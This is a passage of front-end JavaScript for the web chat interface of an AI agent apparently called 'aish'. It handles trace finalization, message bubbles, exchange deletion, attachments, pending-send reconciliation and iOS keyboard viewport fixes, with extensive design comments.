// still-spinning row are finalized on every one of those paths).
function finishTrace(errored) {
  if (!currentTrace) return;
  const t = currentTrace;
  if (t.timer) { clearInterval(t.timer); t.timer = null; }
  releasePinnedTrace(t); // stops pinning, and gives the arrow its base offset back
  if (t.thinkingRow) {
    if (t.thinkingRow.isAnswer) finalizeAnswerRow(t, t.thinkingRow);
    else t.thinkingRow.row.remove();
    t.thinkingRow = null;
  }
  t.pending = null;
  t.activeStartedAt = null;
  currentTrace = null;
  // Finalize any step still spinning — a tool cut off by a server restart
  // mid-run (the "co to czarna dziura?" deploy bug) leaves a running row with
  // no finish event; a closed trace must never keep a perpetual spinner.
  t.body.querySelectorAll(".step.running").forEach((row) => {
    row.classList.remove("running", "active-step");
    const badge = row.querySelector(".step-badge");
    if (badge) badge.innerHTML = traceSvg("denied", "var(--dim)");
    const timer = row.querySelector(".step-timer");
    if (timer) timer.remove();
    const main = row.querySelector(".step-main");
    if (main && !main.querySelector(".step-interrupted")) {
      const note = document.createElement("span");
      note.className = "step-sub step-interrupted";
      note.textContent = "interrupted";
      main.appendChild(note);
    }
  });
  // A pure-answer turn leaves no steps. The box used to be dropped entirely
  // unless it carried token usage (#84) — but the box is now also the door to
  // the turn's full record (#243), and a turn that answered without running
  // anything is exactly the one worth asking about ("why did it just answer?").
  // So it is kept whenever there is a turn to open; with no id there is nothing
  // to open and the old removal stands.
  if (!t.body.querySelector(".step") && !t.tokensIn && !t.tokensOut && !t.turnId) {
    t.el.remove();
    refreshStatusline();
    return;
  }
  if (t.turnId && !t.el.querySelector(".trace-explain")) {
    const door = document.createElement("button");
    door.type = "button";
    door.className = "trace-explain";
    door.dataset.turn = t.turnId;
    door.innerHTML = '<span>Full record</span><span class="trace-explain-chev">\u203a</span>';
    door.onclick = (e) => { e.stopPropagation(); openExplain(t.turnId); };
    t.inner.appendChild(door);
  }
  t.el.classList.remove("live", "stopping");
  t.el.classList.remove("open"); // collapse to the summary; tap to expand
  t.el.querySelector(".trace-status").innerHTML = errored
    ? traceSvg("denied", "var(--red)")
    : traceSvg("check", "var(--green)");
  updateTraceHead(t);
  refreshStatusline();
}
// [TRACE-CLOSE-END]

function fmtSecs(s) {
  if (s == null) return "";
  if (s < 10) return `${s.toFixed(1)}s`;
  if (s < 60) return `${Math.round(s)}s`;
  return `${Math.floor(s / 60)}m ${Math.round(s % 60)}s`;
}
function fmtTokens(n) {
  return n >= 1000 ? (n / 1000).toFixed(1) + "k" : String(n);
}

// ---- message rendering ---------------------------------------------------
function addMsg(kind, text) {
  const el = document.createElement("div");
  el.className = `msg ${kind}`;
  el.textContent = text;
  messagesEl.appendChild(el);
  scrollToEnd();
  return el;
}

// The prompt that started the current turn, so an error (or a finished answer)
// can offer to re-run it.
let lastUserPrompt = "";
const RERUN_SVG =
  '<svg viewBox="0 0 24 24"><path d="M5 6.5v3.6h3.6M19 17.5v-3.6h-3.6M18.4 9.2A6.5 6.5 0 0 0 6.5 8M5.6 14.8A6.5 6.5 0 0 0 17.5 16" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>';

// Regenerate the last answer from scratch (#60): `retry` re-runs the prompt AND
// discards the previous attempt from the model's context, the log, and the
// transcript, so the rerun is not anchored to the old (likely wrong) answer. The
// server cancels a still-running or wedged turn first, so this is safe in every
// state: idle, busy, or stuck after a disruption. The rolled-back transcript
// comes back as a fresh `replay`, so the discarded answer disappears in place.
function rerunPrompt(prompt) {
  if (!prompt) return;
  if (clientBusy) { showToast("can't rerun while working"); return; }
  act({ type: "retry", text: prompt }, { label: "the retry" });
}

// An error message with a Retry button (resends the last prompt, Gemini-style).
function addErrorMsg(text) {
  const wrap = document.createElement("div");
  wrap.className = "msg error error-wrap";
  const body = document.createElement("div");
  body.textContent = text;
  wrap.appendChild(body);
  if (lastUserPrompt) {
    const retry = document.createElement("button");
    retry.type = "button";
    retry.className = "retry-btn";
    retry.innerHTML = RERUN_SVG + "Retry";
    retry.onclick = () => rerunPrompt(lastUserPrompt);
    wrap.appendChild(retry);
  }
  messagesEl.appendChild(wrap);
  scrollToEnd();
  return wrap;
}

// A regenerate control lives only on the MOST RECENT answer (re-runs the last
// prompt as a fresh turn). Branching an arbitrary earlier message is a separate
// feature; this one supersedes itself so only the latest answer carries it.
let lastRegenBtn = null;
function retireRegen() {
  if (lastRegenBtn) { lastRegenBtn.remove(); lastRegenBtn = null; }
}

// Your own prompt bubble: tap-to-recall plus a copy chip underneath (issue
// #39). Copy hands back the prompt minus attachment notes — same text the
// recall paths reuse.
// A compact audit marker for a user-driven workspace change (issue #94):
// "Working directory → <path>" on a /cd, "Trusted <path>" on a dir trust. Same
// row whether emitted live (on_state) or replayed (reconstruct_events). The
// folder glyph is static markup; the path is user data, so it goes in via
// textContent.
function addWorkspaceNote(change, path) {
  const label = change === "cwd" ? "Working directory" : "Trusted directory";
  // During a task, show it INLINE in the activity trace at the moment it
  // happened — exactly like the "You added" steering note — so it sits on the
  // timeline where it occurred, not as a detached row after the answer (#94/#95).
  if (currentTrace) {
    currentTrace.started += 1;
    traceRow(currentTrace, traceSvg("folder", "var(--blue)"), label, abbreviatePath(path));
    updateTraceHead(currentTrace);
    scrollToEnd();
    return;
  }
  // Idle (no live trace): a standalone note, still styled like "You added".
  const el = document.createElement("div");
  el.className = "msg workspace-note";
  const ico = document.createElement("span");
  ico.className = "wsnote-ico";
  ico.innerHTML = FOLDER_SVG;
  const lab = document.createElement("span");
  lab.className = "wsnote-label";
  lab.textContent = label;
  const val = document.createElement("span");
  val.className = "wsnote-path mono";
  val.textContent = abbreviatePath(path);
  el.append(ico, lab, val);
  messagesEl.appendChild(el);
  scrollToEnd();
  return el;
}

// [SYNTHETIC-START]
// A turn aish wrote itself (#171): the restart-recovery note, or the prompt an
// automation triggered a session with. It IS a real turn — it starts a task, so
// every turn side effect still runs — but the human never typed it, so it takes
// the quiet system-note row (the workspace marker's visual language) instead of
// a blue user bubble that would read as their own words.
const SYNTHETIC_LABELS = { resume: "Automatic resume", trigger: "Triggered request" };
// A RESUME ROW SAYS WHAT HAPPENED, NOT WHAT THE MODEL WAS TOLD. The note
// itself is addressed to the model — do not repeat completed steps, here are
// the tool calls that were cut off mid-flight — and it is a page of it, naming
// tools and raw URLs, printed above the answer where he reads. None of it is
// his to act on: he cannot approve, retry or undo any part of it. What he
// needs is the one fact that explains why the transcript above looks half
// finished. The note is still in the log, in full, for `aish explain`.
const RESUME_ROW_TEXT = "aish restarted mid-task and picked up where it left off.";

function addSystemMsg(kind, text) {
  const el = document.createElement("div");
  el.className = "msg system-note";
  const ico = document.createElement("span");
  ico.className = "sysnote-ico";
  ico.innerHTML = kind === "trigger" ? traceSvg("chat", "currentColor") : RERUN_SVG;
  const body = document.createElement("div");
  body.className = "sysnote-body";
  const label = document.createElement("div");
  label.className = "sysnote-label";
  label.textContent = SYNTHETIC_LABELS[kind] || "System";
  const detail = document.createElement("div");
  detail.className = "sysnote-text";
  detail.textContent = kind === "resume" ? RESUME_ROW_TEXT : text;
  body.append(label, detail);
  el.append(ico, body);
  messagesEl.appendChild(el);
  scrollToEnd();
  return el;
}
// [SYNTHETIC-END]

// [MSG-STAMP-START]
// When a turn happened (#200). Absolute, never relative: a rail row is
// re-rendered every time you open the list, so "2m" there stays true, but a
// transcript line is written once and read minutes or months later — "2m" would
// become a lie the moment you looked away. The date appears only when it is not
// today, which is the chat-app convention and keeps the common case to four
// characters.
function messageStamp(atSeconds) {
  const ms = (Number(atSeconds) || 0) * 1000;
  if (!ms) return "";
  const date = new Date(ms);
  const time = date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", hour12: false });
  const today = dayStart(Date.now());
  const day = dayStart(ms);
  if (day >= today) return time;
  if (day >= today - 6 * DAY_MS) return `${date.toLocaleDateString([], { weekday: "short" })} ${time}`;
  return `${date.toLocaleDateString([], { day: "numeric", month: "short" })} ${time}`;
}

// It goes on the turn's OPENING message, once — not on both halves. A turn's
// two messages are seconds apart, so stamping the answer as well would print
// the same time twice for one exchange; and the answer's row already carries
// how LONG it took, which composes into a whole story: asked at 14:32, took 12s.
function stampTurn(tools, at) {
  const text = messageStamp(at);
  if (!text) return;
  const stamp = document.createElement("span");
  stamp.className = "msg-stamp";
  stamp.textContent = text;
  // PREPENDED, so the chips keep the trailing edge they have always had: the
  // row is right-packed, and appending would have shoved every familiar control
  // leftwards to make room for something you only read occasionally.
  tools.prepend(stamp);
}
// [MSG-STAMP-END]

// [REDACT-START]
// Deleting an exchange (#202). A chat had no eraser at all: the log is
// append-only and replayed whole, so a probe fired at the wrong chat, a message
// half-typed and sent by an autocorrect Return, or a secret pasted into the
// composer stayed there forever — the only tools were deleting the entire chat
// or hand-editing JSONL with the server stopped.
//
// The control lives on the PROMPT because the prompt is what a turn is named by,
// and it deletes the whole exchange: an answer repeats what it was asked, so
// taking away half of one is not a deletion.
//
// It asks BEFORE it deletes, in the shared confirmation modal ([CONFIRM]) —
// which is also where the reasoning lives for why an arm-then-confirm chip was
// not enough. The word is DELETE, not "remove": remove reads as "taken off this
// screen", and what happens here is that the text stops existing.
//
// The chip sits at the START of the row rather than its trailing edge: copy and
// reuse are tapped constantly and without thinking, so they keep the edge a
// thumb lands on by habit, and the destructive one does not.
const REDACT_LABEL = "delete this exchange";

function askDeleteTurn(turn) {
  askConfirm({
    title: "Delete this exchange?",
    // Concretely what goes, in the words the UI itself uses for them —
      // "everything it started" was true and told nobody anything.
    body:
      "Deletes your message, the thinking steps and commands it ran, and the " +
      "answer. Gone from this chat, from what the model remembers, and from " +
      "the offline copies on your devices. This cannot be undone.",
    verb: "Delete",
    action: () => act({ type: "redact", turn }, { label: "deleting that exchange" }),
  });
}

function redactChip(turn) {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "copy-chip redact-chip";
  btn.title = REDACT_LABEL;
  btn.setAttribute("aria-label", REDACT_LABEL);
  btn.append(trashIcon());
  btn.onclick = () => askDeleteTurn(turn);
  return btn;
}

// What is left where the exchange was. A chat must not silently lose a turn:
// the answer above it would read as a reply to nothing, and a deletion you
// can't see is indistinguishable from data quietly going missing.
//
// Deliberately UNDATED. The row sits between two timestamped turns, so its
// position already says when; a number on it reads as "deleted at", which is
// not what any stamp here could mean — the only time available is the deleted
// MESSAGE's, so one number would be claiming two different things.
function addRedactedMsg() {
  const el = document.createElement("div");
  el.className = "msg system-note redacted-note";
  const ico = document.createElement("span");
  ico.className = "sysnote-ico";
  ico.append(trashIcon());
  const body = document.createElement("div");
  body.className = "sysnote-body";
  const label = document.createElement("div");
  label.className = "sysnote-label";
  label.textContent = "Message deleted";
  body.appendChild(label);
  el.append(ico, body);
  messagesEl.appendChild(el);
  scrollToEnd();
  return el;
}
// [REDACT-END]

// What you attached, shown as what it is: a thumbnail for an image, a named
// chip for anything else. Tapping an image opens it full size through the same
// token-gated /file endpoint the transcript's inline images use — no second
// policy for where a local path may be loaded from. A PDF's chip opens too,
// onto its pages ([PREVIEW]) — an attachment you cannot look at is a file you
// have to take aish's word about.
// One file, drawn — always the same way, wherever in the message it was written
// (#234). `group` is what a swipe moves between: the pictures in THIS message,
// the set in front of the owner.
function attachmentNode(note, group) {
  const src = note.kind === "image" ? imageSrc(note.path) : null;
  if (!src) return attachmentChip(note);
  const thumb = document.createElement("img");
  thumb.className = "msg-attachment-thumb";
  thumb.src = src;
  thumb.alt = note.name;
  thumb.title = note.name;
  // A file that has since been deleted must not leave a broken-image glyph
  // where a photo was: fall back to naming it, which is still true.
  thumb.onerror = () => thumb.replaceWith(attachmentChip(note));
  thumb.onclick = () =>
    openPreview(src, note.name, group, group.findIndex((g) => g.src === src));
  return thumb;
}

function messagePictures(notes) {
  return notes
    .filter((n) => n.kind === "image" && imageSrc(n.path))
    .map((n) => ({ src: imageSrc(n.path), name: n.name, file: n.path }));
}

function attachmentStrip(notes) {
  const strip = document.createElement("div");
  strip.className = "msg-attachments";
  const group = messagePictures(notes);
  for (const note of notes) strip.appendChild(attachmentNode(note, group));
  return strip;
}

function attachmentChip(note) {
  const chip = document.createElement("span");
  chip.className = "msg-attachment-chip";
  // Shortened from the MIDDLE: the end of a file name is where it differs.
  chip.textContent = shortName(note.name);
  chip.title = note.path; // the full name and path stay one hover away
  // Decided by the PATH, not by the note's kind: a PDF outside the uploads dir
  // is logged as a plain "[attached file: …]" and is just as readable. What may
  // actually be served is the server's call either way — /pdf/page scopes a
  // path exactly as /file does.
  chip.classList.add("attachment-openable");
  if (isPdfPath(note.path)) {
    chip.onclick = () => openPdfPreview(note.path, note.name);
  } else {
    // Everything else — a spreadsheet, a zip, the .txt that started as an
    // attachment nobody could do anything with — SAVES. There is nothing to
    // show it in, and a chip that names a file and then refuses to hand it over
    // is worse than no chip. The title says which of the two a tap does, since
    // the two chips look identical.
    chip.title = `Save ${note.name}`;
    chip.onclick = () => saveAttachment(note.path, note.name);
  }
  return chip;
}

function addUserMsg(text, at, turn, real) {
  // The bubble is the RENDERED message: the words, and each file shown as the
  // thing it is rather than as the line that names it — the same relationship
  // Obsidian has between `![[cat.png]]` in the source and the picture in the
  // note. A file between two clauses pushes them apart and sits full size in
  // the gap; every file draws the same way, wherever it was written (#234).
  const parts = messageParts(text, real);
  const notes = parts.filter((p) => p.type === "file").map((p) => p.note);
  // ONE path, always. There used to be a shortcut for the common message with
  // no files — set the bubble's text directly and skip the loop — and when the
  // loop later stopped skipping, every ordinary message rendered its own words
  // TWICE (#235). Two ways to draw the same thing is what allowed that, so
  // there is now one: the bubble starts empty and everything in it comes from
  // `parts`.
  const el = addMsg("user", "");
  const group = messagePictures(notes);
  let strip = null;
  for (const part of parts) {
    if (part.type === "text") {
      strip = null;
      const run = document.createElement("div");
      run.className = "msg-run";
      run.textContent = part.text;
      el.appendChild(run);
    } else {
      // Files written together stay together — two photos sent at once sit
      // side by side, as they always have. A run of text between them ends the
      // group, which is what puts a picture in the gap it was written into.
      if (!strip) {
        strip = document.createElement("div");
        strip.className = "msg-attachments";
        el.appendChild(strip);
      }
      strip.appendChild(attachmentNode(part.note, group));
    }
  }
  if (notes.length && !stripAttachmentNotes(text, real)) el.classList.add("attachments-only");
  const tools = document.createElement("div");
  tools.className = "user-tools";
  // Copy hands back the SOURCE — the words with `![[cat.png]]` still in them —
  // so a message pasted into notes carries its pictures with it and comes back
  // the same shape it left. Reuse hands back the same message as a message:
  // source into the field, files into the strip ([REUSE-PROMPT]). Both read the
  // parse rather than the rendered node, which carries chip text nobody typed.
  const getSource = () => recordSource(messageBody(text, real), notes);
  const getText = () => messageBody(text, real);
  const getNotes = () => notes;
  // A turn id exists only for a turn the server has logged, so a live turn gets
  // its remove control on the next replay rather than a control that would name
  // nothing.
  currentTurnId = turn || "";
  if (turn) tools.append(redactChip(turn));
  tools.append(reuseChip(getText, getNotes), copyChip(getSource, "copy prompt"));
  stampTurn(tools, at);
  messagesEl.appendChild(tools);
  return el;
}

// [PENDING-SEND-START]
// A message you have sent is on screen BEFORE the server says so.
//
// The composer clears the instant the text is handed to the socket, but the
// blue bubble used to be drawn only when the server ECHOED the turn back. On a
// fast link those are the same moment and the distinction is invisible; on a
// slow one the message exists nowhere the user can see for seconds — the
// composer empty, the transcript unchanged — and a long message reads as simply
// lost. That is exactly how it was reported, and the reader was right to
// believe it: nothing on screen said otherwise.
//
// So the bubble is drawn on SEND, in a pending state, and RECONCILED when the
// server's own version arrives. The server's version wins, always: it carries
// the timestamp, the turn id the delete chip needs, and any attachment notes
// the server appended, none of which the client can know. A message the agent
// is too busy to start comes back as a `queued` event instead — same
// reconciliation, different resolution (the queue chip takes over).
//
// If the bubble's DOM is destroyed while still un-acknowledged — a reconnect
// rebuild, a chat switch, a socket that died — the TEXT is not lost. Never an
// automatic resend: the send may well have arrived, and a duplicated
// instruction to an agent that runs shell commands is a worse outcome than a
// message you have to send again by hand.
//
// BUT "the DOM is going away" IS NOT "the message did not arrive", and
// conflating the two is what shipped a duplicate. The text went straight back
// to the composer on every rebuild — and a rebuild is exactly what a RECONNECT
// does, whose very next act is to replay the transcript the server holds. So
// the recovery fired one moment before the definitive answer arrived, the
// answer said "I have your message", and the owner — looking at a toast that
// said it had not been confirmed, with the words back under the cursor — sent
// it again. Two identical instructions, one of them nobody asked for.
//
// So a detached send is HELD, not handed back, and the replay ADJUDICATES it:
// a transcript that contains the message proves it arrived, and only one that
// does not puts the words in the composer. Held text is persisted, so the
// window costs nothing if the tab dies; and if no replay ever comes to settle
// it (still offline), a deadline hands it back rather than holding forever —
// losing what you typed remains the one unacceptable outcome.
const pendingSends = []; // oldest first — {el, tools, status, text, session}

// Detached, unadjudicated sends: [{ text, session }]. Persisted under their own
// key rather than merged into the draft, because a draft is text you are
// WRITING and this is text you already pressed send on — only one of them may
// be silently dropped when it turns out to have arrived.
const HELD_KEY = "aish-held-sends";
let heldSends = [];
let heldTimer = null;

function loadHeldSends() {
  try {
    const raw = JSON.parse(localStorage.getItem(HELD_KEY));
    heldSends = Array.isArray(raw) ? raw.filter((h) => h && h.text) : [];
  } catch { heldSends = []; }
  // A tab that died holding them left the question open, not answered: this
  // one is about to connect and be replayed the same chat, which can still
  // settle them. Give that its chance — the deadline is what guarantees the
  // words come back if it never comes.
  if (heldSends.length) armHeldRelease();
}

function saveHeldSends() {
  try {
    if (heldSends.length) localStorage.setItem(HELD_KEY, JSON.stringify(heldSends));
    else localStorage.removeItem(HELD_KEY);
  } catch { /* private mode: held in memory only, same as the draft */ }
}

function addPendingSend(text) {
  const el = addMsg("user", text);
  el.classList.add("pending");
  const tools = document.createElement("div");
  tools.className = "user-tools pending-send";
  const status = document.createElement("span");
  status.className = "pending-send-status";
  status.textContent = "Sending…";
  tools.appendChild(status);
  messagesEl.appendChild(tools);
  pendingSends.push({ el, tools, status, text, session: currentSession });
  // SENDING IS SEEING. Your own message is output (it is a message in the
  // chat), so the seen stamp has to move past it or the chat you just typed
  // into flags itself unread the moment you leave — for a sentence you wrote
  // (#203). `markSeen` already runs on entering a chat and at `done`; this is
  // the third moment the log outruns the stamp, and it is the one that shows
  // while the turn is still running.
  markSeen(currentSession);
  armPendingSendWatch();
  scrollToEnd(true);
}

// The server has accounted for one of our sends. Matched by TEXT where it can
// be (two messages fired inside one round trip resolve in whatever order the
// server actually took them), falling back to the oldest — the server appends
// attachment notes, so an exact match is not always available.
function resolvePendingSend(text) {
  const bare = stripAttachmentNotes(text || "");
  let index = pendingSends.findIndex((item) => item.text === bare);
  if (index < 0) index = pendingSends.length ? 0 : -1;
  if (index < 0) return;
  const [item] = pendingSends.splice(index, 1);
  item.el.remove();
  item.tools.remove();
  if (!pendingSends.length) { clearTimeout(pendingSendTimer); pendingSendTimer = null; }
}

// Their DOM is going away while they are still un-acknowledged. The bubbles go
// with it; the TEXT is held, not handed back, until something says whether the
// server has it. Nothing is shown and nothing is said here — a rebuild is
// usually a reconnect, and a reconnect is about to answer the question.
function clearPendingSends() {
  if (!pendingSends.length) return;
  clearTimeout(pendingSendTimer);
  pendingSendTimer = null;
  for (const item of pendingSends.splice(0)) {
    item.el.remove();
    item.tools.remove();
    if (item.text) heldSends.push({ text: item.text, session: item.session });
  }
  saveHeldSends();
  armHeldRelease();
}

// A replay is the server's own account of a chat, so it settles every send held
// for that chat: present means it arrived (drop it silently — the transcript
// already shows it), absent means it did not (the words go back to the
// composer). Matched on EXACT text only, never the oldest-pending fallback
// `resolvePendingSend` may use live: a replay carries every message the chat
// ever had, and a positional match against those would "confirm" a send using
// something the user wrote last week.
function adjudicateHeldSends(session, events) {
  if (!heldSends.length) return;
  const arrived = new Set(
    (events || [])
      .filter((e) => e && e.type === "user" && typeof e.text === "string")
      .map((e) => stripAttachmentNotes(e.text))
  );
  const mine = (h) => !h.session || h.session === session;
  const unsent = heldSends.filter((h) => mine(h) && !arrived.has(h.text));
  heldSends = heldSends.filter((h) => !mine(h));
  saveHeldSends();
  returnToComposer(unsent.map((h) => h.text));
  if (!heldSends.length) { clearTimeout(heldTimer); heldTimer = null; }
}

// Nothing came to settle them — still offline, or the reconnect never landed.
// Holding forever would be losing what you typed by a slower route.
const HELD_RELEASE_MS = 12000;

function armHeldRelease() {
  clearTimeout(heldTimer);
  heldTimer = setTimeout(releaseHeldSends, HELD_RELEASE_MS);
}

function releaseHeldSends() {
  clearTimeout(heldTimer);
  heldTimer = null;
  const texts = heldSends.map((h) => h.text);
  heldSends = [];
  saveHeldSends();
  returnToComposer(texts);
}

// Prepended, so it is the next thing you would send. Skips anything already
// sitting there — a release racing an adjudication must not double the words.
function returnToComposer(texts) {
  const lost = (texts || []).filter((text) => text && !input.value.includes(text));
  if (!lost.length) return;
  input.value = [...lost, input.value].filter(Boolean).join("\n\n");
  saveDraft();
  resizeInput();
  showToast(lost.length > 1 ? "messages not confirmed — back in the composer"
                            : "message not confirmed — back in the composer");
}

// A socket that reports OPEN and is not: nothing will ever come back to resolve
// these, so say so rather than spinning "Sending…" indefinitely.
const PENDING_SEND_SLOW_MS = 8000;
let pendingSendTimer = null;

function armPendingSendWatch() {
  clearTimeout(pendingSendTimer);
  pendingSendTimer = setTimeout(() => {
    pendingSendTimer = null;
    if (pendingSends.length) markPendingSendsStalled();
  }, PENDING_SEND_SLOW_MS);
}

function markPendingSendsStalled() {
  for (const item of pendingSends) {
    if (item.status.dataset.stalled) continue;
    item.status.dataset.stalled = "1";
    item.status.textContent = "Still sending — ";
    const retry = document.createElement("button");
    retry.type = "button";
    retry.className = "pending-send-retry";
    retry.textContent = "reconnect";
    retry.onclick = () => reconnect();
    item.status.appendChild(retry);
  }
}
// [PENDING-SEND-END]

function addAnsiMsg(kind, text) {
  const el = document.createElement("div");
  el.className = `msg ${kind}`;
  el.appendChild(ansiFragment(text));
  messagesEl.appendChild(el);
  scrollToEnd();
  return el;
}

// Consecutive stream lines share one block so the output scrolls sideways as a
// whole; any other message ending up last (echo, answer, card) starts a new one.
// The block sits in a wrapper so its copy chip stays put while the pre-formatted
// content scrolls sideways underneath.
function addStreamLine(text) {
  const last = messagesEl.lastElementChild;
  if (last && last.classList.contains("stream-wrap")) {
    const body = last.querySelector(".stream");
    body.appendChild(document.createTextNode("\n"));
    body.appendChild(ansiFragment(text));
    scrollToEnd();
    return body;
  }
  const wrap = document.createElement("div");
  wrap.className = "stream-wrap";
  const body = document.createElement("div");
  body.className = "msg stream";
  body.appendChild(ansiFragment(text));
  wrap.append(copyChip(() => body.textContent, "copy output"), body);
  messagesEl.appendChild(wrap);
  scrollToEnd();
  return body;
}

function nearBottom() {
  return messagesEl.scrollHeight - messagesEl.scrollTop - messagesEl.clientHeight < 120;
}

function scrollToEnd(force) {
  keepTraceLast(); // whatever was just appended, the live status card stays the tail
  if (force || nearBottom()) messagesEl.scrollTop = messagesEl.scrollHeight;
  updateScrollButton();
  updateEmptyHint(); // every content-adding path funnels through here
}

// Is this chat still unused? Workspace notes (a UI /cd, a dir-trust marker) are
// system metadata, not turns — a chat is "fresh" after one. Named separately
// from updateEmptyHint because [SHARES] asks the same question for a different
// reason: whether opening ANOTHER new chat would just leave an empty one behind.
function transcriptIsEmpty() {
  return (
    messagesEl.childElementCount <= 4 &&
    [...messagesEl.children].every((c) => c.classList.contains("workspace-note"))
  );
}

// Empty-state welcome hero (#123): shown only while the transcript is empty.
function updateEmptyHint() {
  // A workspace-note (a UI /cd or dir-trust marker) is system metadata, not a
  // real turn — a fresh chat is still "empty" for onboarding after one, so the
  // welcome hero stays until the user actually sends a message (#135).
  // Fast path: this runs on EVERY content append (scrollToEnd funnels here),
  // and a populated transcript can only be "empty" if it holds nothing but
  // workspace notes — with more than a handful of children it never is, so
  // skip the per-append array spread over hundreds of nodes.
  $("welcome").hidden = !transcriptIsEmpty(); // brand hero on a fresh chat (#123)
}

// iOS Safari settles keyboard-driven layout changes a beat after the gesture;
// the second pass lands the view at the true bottom once heights are final.
function scrollToEndSettled() {
  scrollToEnd(true);
  setTimeout(() => scrollToEnd(true), 120);
}

// Keyboard show/hide resizes the viewport; if the user was reading the tail,
// keep them pinned to it instead of leaving the bottom hidden. iOS standalone
// additionally pans the layout viewport up to reveal the focused input and
// often forgets to pan back on dismissal, leaving a blank band at the bottom
// (#8) — once the visual viewport is full-height again (keyboard gone), snap
// the window home. Never snap while the keyboard is up: the pan is what keeps
// the composer visible above it.
// Whether an editable element has focus. iOS resizes innerHeight while the
// keyboard animates open, so height comparisons alone briefly misread the
// keyboard as closed — but focus always lands before the viewport events, so
// this is the race-free "hands off the viewport" signal.
function editingNow() {
  const el = document.activeElement;
  return Boolean(el && (el.tagName === "TEXTAREA" || el.tagName === "INPUT" || el.isContentEditable));
}

// Keyboard-free viewport height, the baseline for keyboard detection.
// innerHeight cannot be the reference: on current iOS it tracks the *visual*
// viewport, so with the keyboard settled vv.height === innerHeight (device
// telemetry: both 543 with the pan at 351) and any vv-vs-innerHeight
// comparison reads the keyboard as closed. Refreshed whenever no editable is
// focused and no pan is active, which also tracks rotation and browser-chrome
// changes.
let vvFullHeight = window.visualViewport ? visualViewport.height : 0;

function snapViewportHome() {
  if (!window.visualViewport || editingNow()) return;
  const keyboardClosed = visualViewport.height >= vvFullHeight - 1;
  if (keyboardClosed && (scrollY || visualViewport.offsetTop)) window.scrollTo(0, 0);
}

// iOS standalone ignores interactive-widget=resizes-content, so the keyboard
// resize is done by hand: while the keyboard is up, pin the fixed body to the
// visual viewport's exact box. The composer then sits flush on the
// keyboard/accessory bar and the top bar stays on-screen, instead of iOS
// panning a full-height layout up past the header with a dead gap below
// (#24). The kb-open class also drops the home-indicator padding — the
// keyboard covers that inset, and keeping it was most of the visible black
// strip.
function syncKeyboardInset() {
  if (!window.visualViewport) return;
  if (!editingNow() && !visualViewport.offsetTop) vvFullHeight = visualViewport.height;
  const kbOpen = editingNow() && visualViewport.height < vvFullHeight - 60;
  document.body.classList.toggle("kb-open", kbOpen);
  if (kbOpen) {
    // offsetTop dips negative mid-animation; clamping keeps the header from
    // being pinned above the very edge it must stay under.
    document.body.style.top = `${Math.max(visualViewport.offsetTop, 0)}px`;
    document.body.style.height = `${visualViewport.height}px`;
  } else {
    document.body.style.top = "";
    document.body.style.height = "";
  }
}

// The pan sometimes settles without any visualViewport event — seen when the
// keyboard dismissal is a side effect of hiding its input (closing a sheet)
// while the transcript is being replaced (#8). After such moments, retry the
// snap across the dismissal animation window; each attempt is a no-op unless
// the keyboard is gone and an offset is left over.
function snapViewportSoon() {
  for (const ms of [50, 150, 350, 700]) setTimeout(snapViewportHome, ms);
}

// Temporary #8 diagnostics: the band only reproduces on-device where there is
// no console, so ship the viewport numbers to the server log instead.
function reportViewport(label) {
  const vv = window.visualViewport;
  const text =
    `${label} vv.h=${vv ? vv.height.toFixed(1) : "n/a"} vv.top=${vv ? vv.offsetTop.toFixed(1) : "n/a"}` +
    ` innerH=${innerHeight} scrollY=${scrollY} docH=${document.documentElement.getBoundingClientRect().height.toFixed(1)}` +
    ` screen=${screen.width}x${screen.height} composerBot=${$("composer").getBoundingClientRect().bottom.toFixed(1)}` +
    ` msgTop=${messagesEl.getBoundingClientRect().top.toFixed(1)} msgBot=${messagesEl.getBoundingClientRect().bottom.toFixed(1)}` +
    ` botEl=${(document.elementFromPoint(innerWidth / 2, innerHeight - 4) || {}).id || "none"}` +
    ` bodyTop=${document.body.style.top || "-"} bodyH=${document.body.style.height || "-"}` +
    ` kbOpen=${document.body.classList.contains("kb-open")}` +
    ` active=${(document.activeElement || {}).id || "none"}` +
    ` standalone=${matchMedia("(display-mode: standalone)").matches} rev=${PAGE_REV}` +
    // The preview's own state, when it is up. A misplaced picture is otherwise
    // only describable in words ("it goes off the screen"), and the numbers
    // that would settle it — the scale, the offset, the measured box, and
    // whether the image had even loaded — live only on the device it happened
    // on. `rev` above is in the same line, so a report also says which build
    // produced it.
    previewReport();
  // Pure telemetry: drop it silently when there is no socket. Routing it
  // through send() would toast "not connected" at the user on every offline
  // replay, for a message they never asked to send (#165).
  if (ws && ws.readyState === WebSocket.OPEN) {
    try { send({ type: "client_debug", text }); } catch { /* socket died mid-send */ }
  }
}

// The last state a gesture left the preview in, kept AFTER it closes. The
// report is reached by typing /debug in the composer — which the preview
// covers, and which closing resets — so a live-only reading could never be
// taken for the one case it exists for. Snapshotted at the end of each
// gesture, so "reproduce it, close, /debug" works.
let previewLastReport = "";

function previewSnapshot() {
  if (!previewIsOpen()) return;
  previewLastReport = previewReport().trim();
}

function previewReport() {
  if (!previewIsOpen()) {
    return previewLastReport ? ` preview-was={${previewLastReport}}` : "";
  }
  const box = previewBox();
  const el = $("preview-img");
  const rect = el.getBoundingClientRect();
  const content = box ? previewContent(box.view, box.natural) : null;
  return (
    ` preview=${JSON.stringify(previewState)}` +
    ` view=${box ? `${Math.round(box.view.w)}x${Math.round(box.view.h)}` : "n/a"}` +
    ` natural=${el.naturalWidth}x${el.naturalHeight}` +
    ` content=${content ? `${Math.round(content.w)}x${Math.round(content.h)}` : "n/a"}` +
    // Where the element ACTUALLY is after the transform: if this does not
    // cover the screen, the picture is visibly off it, whatever the state says.
    ` painted=${Math.round(rect.left)},${Math.round(rect.top)} ${Math.round(rect.width)}x${Math.round(rect.height)}` +
    ` complete=${el.complete}`
  );
}

let lastVvReport = 0;

// [VV-SETTLE-START]
if (window.visualViewport) {
  const onViewportChange = () => {
    // A live transcript touch freezes settling (see [TOUCH-FREEZE]): the
    // keyboard dismissal that touch just triggered would otherwise reflow and
    // auto-scroll the content mid-press, cancelling the long-press selection
    // the blur made possible. An established selection likewise must not be
    // yanked to the bottom by a later keyboard show/hide.
    if (viewportSettleAllowed()) {
      syncKeyboardInset();
      snapViewportHome();
      if (!selectionActive()) scrollToEnd();
    } else {
